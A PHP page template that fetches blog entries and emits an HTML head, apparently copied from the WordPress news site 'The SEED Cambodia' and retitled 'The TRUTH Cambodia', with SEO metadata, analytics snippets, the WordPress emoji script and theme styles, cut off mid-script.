<?php
require_once '../connection/db.php';
require_once '../config/config.php';
require_once __DIR__ . '/../controllers/HomeController.php';

$homeController = new HomeController();
$blog = $homeController->listBlog();
$blog1 = $homeController->blog1();
$blog2 = $homeController->blog2();

?>
<html lang="en-US" class="td-md-is-chrome wf-khmer-n4-active wf-active">

<head>
    <meta charset="UTF-8">
    <title>The TRUTH Cambodia</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="pingback" href="https://www.theseedcambodia.com/xmlrpc.php">
    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
    <link rel="icon" type="image/png" href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-300x300.png">
    <!-- This site is optimized with the Yoast SEO plugin v23.5 - https://yoast.com/wordpress/plugins/seo/ -->
    <meta name="description" content="​T​h​e​ TRUTH ​មិនមែន​ធ្វើការ​លើ​សារ​ព័ត៌មាន​ ​និង​បម្រើ​មនោគម​ន៍​វិជ្ជា​ណាមួយ​ឡើយ​។​ ​T​h​e​ TRUTH ​គឺជា​ក្រុម​ដែល​ធ្វើ​កិច្ច​វិភាគ​">
    <link rel="canonical" href="https://www.theseedcambodia.com/">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="website">
    <meta property="og:title" content="The SEED Cambodia">
    <meta property="og:description" content="​T​h​e​ TRUTH ​មិនមែន​ធ្វើការ​លើ​សារ​ព័ត៌មាន​ ​និង​បម្រើ​មនោគម​ន៍​វិជ្ជា​ណាមួយ​ឡើយ​។​ ​T​h​e​ TRUTH ​គឺជា​ក្រុម​ដែល​ធ្វើ​កិច្ច​វិភាគ​">
    <meta property="og:url" content="https://www.theseedcambodia.com/">
    <meta property="og:site_name" content="The SEED Cambodia">
    <meta property="article:publisher" content="https://www.facebook.com/TheSEEDCambodia">
    <meta property="article:modified_time" content="2023-07-10T08:23:00+00:00">
    <meta name="twitter:card" content="summary_large_image">
    <script id="bravePopu_webfontLoader" src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript" async=""></script>
    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-TR8R32W8F6&amp;cx=c&amp;gtm=45He53o2v9133357755za200&amp;tag_exp=102482433~102788824~102803279~102813109~102887799~102926327"></script>
    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WG2S4ZV"></script>
    <script type="application/ld+json" class="yoast-schema-graph">
        {
            "@context": "https://schema.org",
            "@graph": [{
                "@type": "WebPage",
                "@id": "https://www.theseedcambodia.com/",
                "url": "https://www.theseedcambodia.com/",
                "name": "The SEED Cambodia",
                "isPartOf": {
                    "@id": "https://www.theseedcambodia.com/#website"
                },
                "about": {
                    "@id": "https://www.theseedcambodia.com/#organization"
                },
                "datePublished": "2021-08-26T09:33:06+00:00",
                "dateModified": "2023-07-10T08:23:00+00:00",
                "description": "​T​h​e​ TRUTH ​មិនមែន​ធ្វើការ​លើ​សារ​ព័ត៌មាន​ ​និង​បម្រើ​មនោគម​ន៍​វិជ្ជា​ណាមួយ​ឡើយ​។​ ​T​h​e​ TRUTH ​គឺជា​ក្រុម​ដែល​ធ្វើ​កិច្ច​វិភាគ​",
                "breadcrumb": {
                    "@id": "https://www.theseedcambodia.com/#breadcrumb"
                },
                "inLanguage": "en-US",
                "potentialAction": [{
                    "@type": "ReadAction",
                    "target": ["https://www.theseedcambodia.com/"]
                }]
            }, {
                "@type": "BreadcrumbList",
                "@id": "https://www.theseedcambodia.com/#breadcrumb",
                "itemListElement": [{
                    "@type": "ListItem",
                    "position": 1,
                    "name": "Home"
                }]
            }, {
                "@type": "WebSite",
                "@id": "https://www.theseedcambodia.com/#website",
                "url": "https://www.theseedcambodia.com/",
                "name": "The SEED Cambodia",
                "description": "",
                "publisher": {
                    "@id": "https://www.theseedcambodia.com/#organization"
                },
                "potentialAction": [{
                    "@type": "SearchAction",
                    "target": {
                        "@type": "EntryPoint",
                        "urlTemplate": "https://www.theseedcambodia.com/?s={search_term_string}"
                    },
                    "query-input": {
                        "@type": "PropertyValueSpecification",
                        "valueRequired": true,
                        "valueName": "search_term_string"
                    }
                }],
                "inLanguage": "en-US"
            }, {
                "@type": "Organization",
                "@id": "https://www.theseedcambodia.com/#organization",
                "name": "The Seed Cambodia",
                "url": "https://www.theseedcambodia.com/",
                "logo": {
                    "@type": "ImageObject",
                    "inLanguage": "en-US",
                    "@id": "https://www.theseedcambodia.com/#/schema/logo/image/",
                    "url": "https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED.png",
                    "contentUrl": "https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED.png",
                    "width": 512,
                    "height": 512,
                    "caption": "The Seed Cambodia"
                },
                "image": {
                    "@id": "https://www.theseedcambodia.com/#/schema/logo/image/"
                },
                "sameAs": ["https://www.facebook.com/TheSEEDCambodia", "https://www.instagram.com/the_seed_cambodia/"]
            }]
        }
    </script>
    <meta name="google-site-verification" content="_M3RMSc4wgJemlG_atZbzpm372dOFIXd-nSpboVLcWM">
    <!-- / Yoast SEO plugin. -->


    <link rel="dns-prefetch" href="//www.googletagmanager.com">
    <link rel="dns-prefetch" href="//fonts.googleapis.com">
    <link rel="alternate" type="application/rss+xml" title="The SEED Cambodia » Feed" href="https://www.theseedcambodia.com/feed/">
    <link rel="alternate" type="application/rss+xml" title="The SEED Cambodia » Comments Feed" href="https://www.theseedcambodia.com/comments/feed/">
    <style type="text/css">
        .brave_popup {
            display: none
        }
    </style>
    <script data-no-optimize="1">
        var brave_popup_data = {};
        var bravepop_emailValidation = false;
        var brave_popup_videos = {};
        var brave_popup_formData = {};
        var brave_popup_adminUser = false;
        var brave_popup_pageInfo = {
            "type": "front",
            "pageID": 6574,
            "singleType": ""
        };
        var bravepop_emailSuggestions = {};
    </script>
    <script type="text/javascript">
        /* <![CDATA[ */
        window._wpemojiSettings = {
            "baseUrl": "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/",
            "ext": ".png",
            "svgUrl": "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/",
            "svgExt": ".svg",
            "source": {
                "concatemoji": "https:\/\/www.theseedcambodia.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.5"
            }
        };
        /*! This file is auto-generated */
        ! function(i, n) {
            var o, s, e;

            function c(e) {
                try {
                    var t = {
                        supportTests: e,
                        timestamp: (new Date).valueOf()
                    };
                    sessionStorage.setItem(o, JSON.stringify(t))
                } catch (e) {}
            }

            function p(e, t, n) {
                e.clearRect(0, 0, e.canvas.width, e.canvas.height), e.fillText(t, 0, 0);
                var t = new Uint32Array(e.getImageData(0, 0, e.canvas.width, e.canvas.height).data),
                    r = (e.clearRect(0, 0, e.canvas.width, e.canvas.height), e.fillText(n, 0, 0), new Uint32Array(e.getImageData(0, 0, e.canvas.width, e.canvas.height).data));
                return t.every(function(e, t) {
                    return e === r[t]
                })
            }

            function u(e, t, n) {
                switch (t) {
                    case "flag":
                        return n(e, "\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f", "\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f") ? !1 : !n(e, "\ud83c\uddfa\ud83c\uddf3", "\ud83c\uddfa\u200b\ud83c\uddf3") && !n(e, "\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f", "\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");
                    case "emoji":
                        return !n(e, "\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff", "\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")
                }
                return !1
            }

            function f(e, t, n) {
                var r = "undefined" != typeof WorkerGlobalScope && self instanceof WorkerGlobalScope ? new OffscreenCanvas(300, 150) : i.createElement("canvas"),
                    a = r.getContext("2d", {
                        willReadFrequently: !0
                    }),
                    o = (a.textBaseline = "top", a.font = "600 32px Arial", {});
                return e.forEach(function(e) {
                    o[e] = t(a, e, n)
                }), o
            }

            function t(e) {
                var t = i.createElement("script");
                t.src = e, t.defer = !0, i.head.appendChild(t)
            }
            "undefined" != typeof Promise && (o = "wpEmojiSettingsSupports", s = ["flag", "emoji"], n.supports = {
                everything: !0,
                everythingExceptFlag: !0
            }, e = new Promise(function(e) {
                i.addEventListener("DOMContentLoaded", e, {
                    once: !0
                })
            }), new Promise(function(t) {
                var n = function() {
                    try {
                        var e = JSON.parse(sessionStorage.getItem(o));
                        if ("object" == typeof e && "number" == typeof e.timestamp && (new Date).valueOf() < e.timestamp + 604800 && "object" == typeof e.supportTests) return e.supportTests
                    } catch (e) {}
                    return null
                }();
                if (!n) {
                    if ("undefined" != typeof Worker && "undefined" != typeof OffscreenCanvas && "undefined" != typeof URL && URL.createObjectURL && "undefined" != typeof Blob) try {
                        var e = "postMessage(" + f.toString() + "(" + [JSON.stringify(s), u.toString(), p.toString()].join(",") + "));",
                            r = new Blob([e], {
                                type: "text/javascript"
                            }),
                            a = new Worker(URL.createObjectURL(r), {
                                name: "wpTestEmojiSupports"
                            });
                        return void(a.onmessage = function(e) {
                            c(n = e.data), a.terminate(), t(n)
                        })
                    } catch (e) {}
                    c(n = f(s, u, p))
                }
                t(n)
            }).then(function(e) {
                for (var t in e) n.supports[t] = e[t], n.supports.everything = n.supports.everything && n.supports[t], "flag" !== t && (n.supports.everythingExceptFlag = n.supports.everythingExceptFlag && n.supports[t]);
                n.supports.everythingExceptFlag = n.supports.everythingExceptFlag && !n.supports.flag, n.DOMReady = !1, n.readyCallback = function() {
                    n.DOMReady = !0
                }
            }).then(function() {
                return e
            }).then(function() {
                var e;
                n.supports.everything || (n.readyCallback(), (e = n.source || {}).concatemoji ? t(e.concatemoji) : e.wpemoji && e.twemoji && (t(e.twemoji), t(e.wpemoji)))
            }))
        }((window, document), window._wpemojiSettings);
        /* ]]> */
    </script>
    <style id="wp-emoji-styles-inline-css" type="text/css">
        img.wp-smiley,
        img.emoji {
            display: inline !important;
            border: none !important;
            box-shadow: none !important;
            height: 1em !important;
            width: 1em !important;
            margin: 0 0.07em !important;
            vertical-align: -0.1em !important;
            background: none !important;
            padding: 0 !important;
        }
    </style>
    <style id="classic-theme-styles-inline-css" type="text/css">
        /*! This file is auto-generated */
        .wp-block-button__link {
            color: #fff;
            background-color: #32373c;
            border-radius: 9999px;
            box-shadow: none;
            text-decoration: none;
            padding: calc(.667em + 2px) calc(1.333em + 2px);
            font-size: 1.125em
        }

        .wp-block-file__button {
            background: #32373c;
            color: #fff;
            text-decoration: none
        }
    </style>
    <style id="global-styles-inline-css" type="text/css">
        body {
            --wp--preset--color--black: #000000;
            --wp--preset--color--cyan-bluish-gray: #abb8c3;
            --wp--preset--color--white: #ffffff;
            --wp--preset--color--pale-pink: #f78da7;
            --wp--preset--color--vivid-red: #cf2e2e;
            --wp--preset--color--luminous-vivid-orange: #ff6900;
            --wp--preset--color--luminous-vivid-amber: #fcb900;
            --wp--preset--color--light-green-cyan: #7bdcb5;
            --wp--preset--color--vivid-green-cyan: #00d084;
            --wp--preset--color--pale-cyan-blue: #8ed1fc;
            --wp--preset--color--vivid-cyan-blue: #0693e3;
            --wp--preset--color--vivid-purple: #9b51e0;
            --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg, rgba(6, 147, 227, 1) 0%, rgb(155, 81, 224) 100%);
            --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg, rgb(122, 220, 180) 0%, rgb(0, 208, 130) 100%);
            --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg, rgba(252, 185, 0, 1) 0%, rgba(255, 105, 0, 1) 100%);
            --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg, rgba(255, 105, 0, 1) 0%, rgb(207, 46, 46) 100%);
            --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg, rgb(238, 238, 238) 0%, rgb(169, 184, 195) 100%);
            --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg, rgb(74, 234, 220) 0%, rgb(151, 120, 209) 20%, rgb(207, 42, 186) 40%, rgb(238, 44, 130) 60%, rgb(251, 105, 98) 80%, rgb(254, 248, 76) 100%);
            --wp--preset--gradient--blush-light-purple: linear-gradient(135deg, rgb(255, 206, 236) 0%, rgb(152, 150, 240) 100%);
            --wp--preset--gradient--blush-bordeaux: linear-gradient(135deg, rgb(254, 205, 165) 0%, rgb(254, 45, 45) 50%, rgb(107, 0, 62) 100%);
            --wp--preset--gradient--luminous-dusk: linear-gradient(135deg, rgb(255, 203, 112) 0%, rgb(199, 81, 192) 50%, rgb(65, 88, 208) 100%);
            --wp--preset--gradient--pale-ocean: linear-gradient(135deg, rgb(255, 245, 203) 0%, rgb(182, 227, 212) 50%, rgb(51, 167, 181) 100%);
            --wp--preset--gradient--electric-grass: linear-gradient(135deg, rgb(202, 248, 128) 0%, rgb(113, 206, 126) 100%);
            --wp--preset--gradient--midnight: linear-gradient(135deg, rgb(2, 3, 129) 0%, rgb(40, 116, 252) 100%);
            --wp--preset--font-size--small: 11px;
            --wp--preset--font-size--medium: 20px;
            --wp--preset--font-size--large: 32px;
            --wp--preset--font-size--x-large: 42px;
            --wp--preset--font-size--regular: 15px;
            --wp--preset--font-size--larger: 50px;
            --wp--preset--spacing--20: 0.44rem;
            --wp--preset--spacing--30: 0.67rem;
            --wp--preset--spacing--40: 1rem;
            --wp--preset--spacing--50: 1.5rem;
            --wp--preset--spacing--60: 2.25rem;
            --wp--preset--spacing--70: 3.38rem;
            --wp--preset--spacing--80: 5.06rem;
            --wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);
            --wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);
            --wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);
            --wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);
            --wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);
        }

        :where(.is-layout-flex) {
            gap: 0.5em;
        }

        :where(.is-layout-grid) {
            gap: 0.5em;
        }

        body .is-layout-flow>.alignleft {
            float: left;
            margin-inline-start: 0;
            margin-inline-end: 2em;
        }

        body .is-layout-flow>.alignright {
            float: right;
            margin-inline-start: 2em;
            margin-inline-end: 0;
        }

        body .is-layout-flow>.aligncenter {
            margin-left: auto !important;
            margin-right: auto !important;
        }

        body .is-layout-constrained>.alignleft {
            float: left;
            margin-inline-start: 0;
            margin-inline-end: 2em;
        }

        body .is-layout-constrained>.alignright {
            float: right;
            margin-inline-start: 2em;
            margin-inline-end: 0;
        }

        body .is-layout-constrained>.aligncenter {
            margin-left: auto !important;
            margin-right: auto !important;
        }

        body .is-layout-constrained> :where(:not(.alignleft):not(.alignright):not(.alignfull)) {
            max-width: var(--wp--style--global--content-size);
            margin-left: auto !important;
            margin-right: auto !important;
        }

        body .is-layout-constrained>.alignwide {
            max-width: var(--wp--style--global--wide-size);
        }

        body .is-layout-flex {
            display: flex;
        }

        body .is-layout-flex {
            flex-wrap: wrap;
            align-items: center;
        }

        body .is-layout-flex>* {
            margin: 0;
        }

        body .is-layout-grid {
            display: grid;
        }

        body .is-layout-grid>* {
            margin: 0;
        }

        :where(.wp-block-columns.is-layout-flex) {
            gap: 2em;
        }

        :where(.wp-block-columns.is-layout-grid) {
            gap: 2em;
        }

        :where(.wp-block-post-template.is-layout-flex) {
            gap: 1.25em;
        }

        :where(.wp-block-post-template.is-layout-grid) {
            gap: 1.25em;
        }

        .has-black-color {
            color: var(--wp--preset--color--black) !important;
        }

        .has-cyan-bluish-gray-color {
            color: var(--wp--preset--color--cyan-bluish-gray) !important;
        }

        .has-white-color {
            color: var(--wp--preset--color--white) !important;
        }

        .has-pale-pink-color {
            color: var(--wp--preset--color--pale-pink) !important;
        }

        .has-vivid-red-color {
            color: var(--wp--preset--color--vivid-red) !important;
        }

        .has-luminous-vivid-orange-color {
            color: var(--wp--preset--color--luminous-vivid-orange) !important;
        }

        .has-luminous-vivid-amber-color {
            color: var(--wp--preset--color--luminous-vivid-amber) !important;
        }

        .has-light-green-cyan-color {
            color: var(--wp--preset--color--light-green-cyan) !important;
        }

        .has-vivid-green-cyan-color {
            color: var(--wp--preset--color--vivid-green-cyan) !important;
        }

        .has-pale-cyan-blue-color {
            color: var(--wp--preset--color--pale-cyan-blue) !important;
        }

        .has-vivid-cyan-blue-color {
            color: var(--wp--preset--color--vivid-cyan-blue) !important;
        }

        .has-vivid-purple-color {
            color: var(--wp--preset--color--vivid-purple) !important;
        }

        .has-black-background-color {
            background-color: var(--wp--preset--color--black) !important;
        }

        .has-cyan-bluish-gray-background-color {
            background-color: var(--wp--preset--color--cyan-bluish-gray) !important;
        }

        .has-white-background-color {
            background-color: var(--wp--preset--color--white) !important;
        }

        .has-pale-pink-background-color {
            background-color: var(--wp--preset--color--pale-pink) !important;
        }

        .has-vivid-red-background-color {
            background-color: var(--wp--preset--color--vivid-red) !important;
        }

        .has-luminous-vivid-orange-background-color {
            background-color: var(--wp--preset--color--luminous-vivid-orange) !important;
        }

        .has-luminous-vivid-amber-background-color {
            background-color: var(--wp--preset--color--luminous-vivid-amber) !important;
        }

        .has-light-green-cyan-background-color {
            background-color: var(--wp--preset--color--light-green-cyan) !important;
        }

        .has-vivid-green-cyan-background-color {
            background-color: var(--wp--preset--color--vivid-green-cyan) !important;
        }

        .has-pale-cyan-blue-background-color {
            background-color: var(--wp--preset--color--pale-cyan-blue) !important;
        }

        .has-vivid-cyan-blue-background-color {
            background-color: var(--wp--preset--color--vivid-cyan-blue) !important;
        }

        .has-vivid-purple-background-color {
            background-color: var(--wp--preset--color--vivid-purple) !important;
        }

        .has-black-border-color {
            border-color: var(--wp--preset--color--black) !important;
        }

        .has-cyan-bluish-gray-border-color {
            border-color: var(--wp--preset--color--cyan-bluish-gray) !important;
        }

        .has-white-border-color {
            border-color: var(--wp--preset--color--white) !important;
        }

        .has-pale-pink-border-color {
            border-color: var(--wp--preset--color--pale-pink) !important;
        }

        .has-vivid-red-border-color {
            border-color: var(--wp--preset--color--vivid-red) !important;
        }

        .has-luminous-vivid-orange-border-color {
            border-color: var(--wp--preset--color--luminous-vivid-orange) !important;
        }

        .has-luminous-vivid-amber-border-color {
            border-color: var(--wp--preset--color--luminous-vivid-amber) !important;
        }

        .has-light-green-cyan-border-color {
            border-color: var(--wp--preset--color--light-green-cyan) !important;
        }

        .has-vivid-green-cyan-border-color {
            border-color: var(--wp--preset--color--vivid-green-cyan) !important;
        }

        .has-pale-cyan-blue-border-color {
            border-color: var(--wp--preset--color--pale-cyan-blue) !important;
        }

        .has-vivid-cyan-blue-border-color {
            border-color: var(--wp--preset--color--vivid-cyan-blue) !important;
        }

        .has-vivid-purple-border-color {
            border-color: var(--wp--preset--color--vivid-purple) !important;
        }

        .has-vivid-cyan-blue-to-vivid-purple-gradient-background {
            background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;
        }

        .has-light-green-cyan-to-vivid-green-cyan-gradient-background {
            background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;
        }

        .has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background {
            background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;
        }

        .has-luminous-vivid-orange-to-vivid-red-gradient-background {
            background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;
        }

        .has-very-light-gray-to-cyan-bluish-gray-gradient-background {
            background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;
        }

        .has-cool-to-warm-spectrum-gradient-background {
            background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;
        }

        .has-blush-light-purple-gradient-background {
            background: var(--wp--preset--gradient--blush-light-purple) !important;
        }

        .has-blush-bordeaux-gradient-background {
            background: var(--wp--preset--gradient--blush-bordeaux) !important;
        }

        .has-luminous-dusk-gradient-background {
            background: var(--wp--preset--gradient--luminous-dusk) !important;
        }

        .has-pale-ocean-gradient-background {
            background: var(--wp--preset--gradient--pale-ocean) !important;
        }

        .has-electric-grass-gradient-background {
            background: var(--wp--preset--gradient--electric-grass) !important;
        }

        .has-midnight-gradient-background {
            background: var(--wp--preset--gradient--midnight) !important;
        }

        .has-small-font-size {
            font-size: var(--wp--preset--font-size--small) !important;
        }

        .has-medium-font-size {
            font-size: var(--wp--preset--font-size--medium) !important;
        }

        .has-large-font-size {
            font-size: var(--wp--preset--font-size--large) !important;
        }

        .has-x-large-font-size {
            font-size: var(--wp--preset--font-size--x-large) !important;
        }

        .wp-block-navigation a:where(:not(.wp-element-button)) {
            color: inherit;
        }

        :where(.wp-block-post-template.is-layout-flex) {
            gap: 1.25em;
        }

        :where(.wp-block-post-template.is-layout-grid) {
            gap: 1.25em;
        }

        :where(.wp-block-columns.is-layout-flex) {
            gap: 2em;
        }

        :where(.wp-block-columns.is-layout-grid) {
            gap: 2em;
        }

        .wp-block-pullquote {
            font-size: 1.5em;
            line-height: 1.6;
        }
    </style>
    <link rel="stylesheet" id="advanced-page-visit-counter-css" href="https://www.theseedcambodia.com/wp-content/plugins/advanced-page-visit-counter/public/css/advanced-page-visit-counter-public.css?ver=9.1.1" type="text/css" media="all">
    <link rel="stylesheet" id="td-plugin-multi-purpose-css" href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/td-multi-purpose/style.css?ver=3833ae26cf1f9d406448012ce1734aa1" type="text/css" media="all">
    <link rel="stylesheet" id="google-fonts-style-css" href="https://fonts.googleapis.com/css?family=Open+Sans%3A400%2C600%2C700%7CRoboto%3A400%2C500%2C700%7COdor+Mean+Chey%3A400%7CKantumruy%3A700%2C400%7COpen+Sans%3A900%2C400%7CLato%3A900%2C700%2C400%7CRoboto+Slab%3A400&amp;display=swap&amp;ver=12.6.2" type="text/css" media="all">
    <link rel="stylesheet" id="newsletter-css" href="https://www.theseedcambodia.com/wp-content/plugins/newsletter/style.css?ver=8.7.5" type="text/css" media="all">
    <link rel="stylesheet" id="font_awesome-css" href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/assets/fonts/font-awesome/font-awesome.css?ver=3833ae26cf1f9d406448012ce1734aa1" type="text/css" media="all">
    <link rel="stylesheet" id="td-multipurpose-css" href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/assets/fonts/td-multipurpose/td-multipurpose.css?ver=3833ae26cf1f9d406448012ce1734aa1" type="text/css" media="all">
    <link rel="stylesheet" id="typicons-css" href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/assets/fonts/typicons/typicons.css?ver=3833ae26cf1f9d406448012ce1734aa1" type="text/css" media="all">
    <link rel="stylesheet" id="td-theme-css" href="https://www.theseedcambodia.com/wp-content/themes/Newspaper/style.css?ver=12.6.2" type="text/css" media="all">
    <style id="td-theme-inline-css" type="text/css">
        @media (max-width:767px) {
            .td-header-desktop-wrap {
                display: none
            }
        }

        @media (min-width:767px) {
            .td-header-mobile-wrap {
                display: none
            }
        }
    </style>
    <link rel="stylesheet" id="wpgdprc-front-css-css" href="https://www.theseedcambodia.com/wp-content/plugins/wp-gdpr-compliance/Assets/css/front.css?ver=1706523551" type="text/css" media="all">
    <style id="wpgdprc-front-css-inline-css" type="text/css">
        :root {
            --wp-gdpr--bar--background-color: #000000;
            --wp-gdpr--bar--color: #ffffff;
            --wp-gdpr--button--background-color: #000000;
            --wp-gdpr--button--background-color--darken: #000000;
            --wp-gdpr--button--color: #ffffff;
        }
    </style>
    <link rel="stylesheet" id="td-legacy-framework-front-style-css" href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/legacy/Newspaper/assets/css/td_legacy_main.css?ver=3833ae26cf1f9d406448012ce1734aa1" type="text/css" media="all">
    <link rel="stylesheet" id="tdb_style_cloud_templates_front-css" href="https://www.theseedcambodia.com/wp-content/plugins/td-cloud-library/assets/css/tdb_main.css?ver=34c58173fa732974ccb0ca4df5ede162" type="text/css" media="all">
    <script type="text/javascript" src="https://www.theseedcambodia.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
    <script type="text/javascript" src="https://www.theseedcambodia.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
    <script type="text/javascript" src="https://www.theseedcambodia.com/wp-content/plugins/advanced-page-visit-counter/public/js/advanced-page-visit-counter-public.js?ver=9.1.1" id="advanced-page-visit-counter-js"></script>

    <!-- Google tag (gtag.js) snippet added by Site Kit -->

    <!-- Google Analytics snippet added by Site Kit -->
    <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-TR8R32W8F6" id="google_gtagjs-js" async=""></script>
    <script type="text/javascript" id="google_gtagjs-js-after">
        /* <![CDATA[ */
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag("set", "linker", {
            "domains": ["www.theseedcambodia.com"]
        });
        gtag("js", new Date());
        gtag("set", "developer_id.dZTNiMT", true);
        gtag("config", "G-TR8R32W8F6");
        /* ]]> */
    </script>

    <!-- End Google tag (gtag.js) snippet added by Site Kit -->
    <script type="text/javascript" id="wpgdprc-front-js-js-extra">
        /* <![CDATA[ */
        var wpgdprcFront = {
            "ajaxUrl": "https:\/\/www.theseedcambodia.com\/wp-admin\/admin-ajax.php",
            "ajaxNonce": "374fc1f968",
            "ajaxArg": "security",
            "pluginPrefix": "wpgdprc",
            "blogId": "1",
            "isMultiSite": "",
            "locale": "en_US",
            "showSignUpModal": "",
            "showFormModal": "",
            "cookieName": "wpgdprc-consent",
            "consentVersion": "",
            "path": "\/",
            "prefix": "wpgdprc"
        };
        /* ]]> */
    </script>
    <script type="text/javascript" src="https://www.theseedcambodia.com/wp-content/plugins/wp-gdpr-compliance/Assets/js/front.min.js?ver=1706523551" id="wpgdprc-front-js-js"></script>
    <link rel="https://api.w.org/" href="https://www.theseedcambodia.com/wp-json/">
    <link rel="alternate" type="application/json" href="https://www.theseedcambodia.com/wp-json/wp/v2/pages/6574">
    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.theseedcambodia.com/xmlrpc.php?rsd">
    <meta name="generator" content="WordPress 6.4.5">
    <link rel="shortlink" href="https://www.theseedcambodia.com/">
    <link rel="alternate" type="application/json+oembed" href="https://www.theseedcambodia.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.theseedcambodia.com%2F">
    <link rel="alternate" type="text/xml+oembed" href="https://www.theseedcambodia.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.theseedcambodia.com%2F&amp;format=xml">
    <meta name="generator" content="Site Kit by Google 1.149.1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Battambang:wght@400;700&amp;family=Hanuman:wght@400;700&amp;family=Kantumruy:wght@300;400;700&amp;family=Siemreap&amp;display=swap" rel="stylesheet">

    <!-- Google Tag Manager -->
    <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-WG2S4ZV');
    </script>
    <!-- End Google Tag Manager --><!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
    <script>
        window.tdb_global_vars = {
            "wpRestUrl": "https:\/\/www.theseedcambodia.com\/wp-json\/",
            "permalinkStructure": "\/article\/%post_id%\/"
        };
        window.tdb_p_autoload_vars = {
            "isAjax": false,
            "isAdminBarShowing": false,
            "autoloadScrollPercent": 50
        };
    </script>

    <style id="tdb-global-colors">
        :root {
            --accent-color: #fff
        }
    </style>


    <!-- JS generated by theme -->

    <script>
        var tdBlocksArray = []; //here we store all the items for the current page

        // td_block class - each ajax block uses a object of this class for requests
        function tdBlock() {
            this.id = '';
            this.block_type = 1; //block type id (1-234 etc)
            this.atts = '';
            this.td_column_number = '';
            this.td_current_page = 1; //
            this.post_count = 0; //from wp
            this.found_posts = 0; //from wp
            this.max_num_pages = 0; //from wp
            this.td_filter_value = ''; //current live filter value
            this.is_ajax_running = false;
            this.td_user_action = ''; // load more or infinite loader (used by the animation)
            this.header_color = '';
            this.ajax_pagination_infinite_stop = ''; //show load more at page x
        }

        // td_js_generator - mini detector
        (function() {
            var htmlTag = document.getElementsByTagName("html")[0];

            if (navigator.userAgent.indexOf("MSIE 10.0") > -1) {
                htmlTag.className += ' ie10';
            }

            if (!!navigator.userAgent.match(/Trident.*rv\:11\./)) {
                htmlTag.className += ' ie11';
            }

            if (navigator.userAgent.indexOf("Edge") > -1) {
